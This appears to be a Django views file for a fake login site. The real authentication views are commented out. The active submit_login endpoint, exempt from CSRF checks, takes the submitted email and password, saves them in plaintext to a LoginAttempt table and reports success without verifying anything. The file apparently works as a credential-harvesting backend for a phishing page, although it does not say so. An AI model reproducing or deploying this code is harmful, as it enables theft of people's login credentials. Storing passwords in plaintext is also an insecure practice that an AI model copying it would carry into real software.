from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse
from .models import LoginAttempt
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.shortcuts import render, redirect
from django.http import HttpResponse
import json
'''
def signup_view(request):
    if request.method == "POST":
        username = request.POST["username"]
        password = request.POST["password"]
        user = User.objects.create_user(username=username, password=password)
        return HttpResponse("User created!")
    return render(request, "signup.html")

def login_view(request):
    if request.method == "POST":
        username = request.POST["username"]
        password = request.POST["password"]
        user = authenticate(request, username=username, password=password)
        if user:
            login(request, user)
            return HttpResponse("Logged in successfully!")
        else:
            return HttpResponse("Invalid credentials")
    return render(request, "login.html")

def logout_view(request):
    logout(request)
    return HttpResponse("Logged out!")
'''
import os
from django.http import FileResponse, Http404

def home(request):
    # Path to the static index.html
    base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    index_path = os.path.join(base_dir, 'frontend', 'index.html')
    try:
        return FileResponse(open(index_path, 'rb'), content_type='text/html')
    except FileNotFoundError:
        raise Http404('index.html not found')


@csrf_exempt
def submit_login(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body.decode('utf-8'))
            email = data.get('email')
            password = data.get('password')
            
            if not email or not password:
                return JsonResponse({'success': False, 'error': 'Missing email or password'}, status=400)
            
            # This line inserts the data into the database
            LoginAttempt.objects.create(email=email, password=password)
            
            return JsonResponse({'success': True})
        
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)}, status=400)
        
    return JsonResponse({'success': False, 'error': 'Invalid request'}, status=405)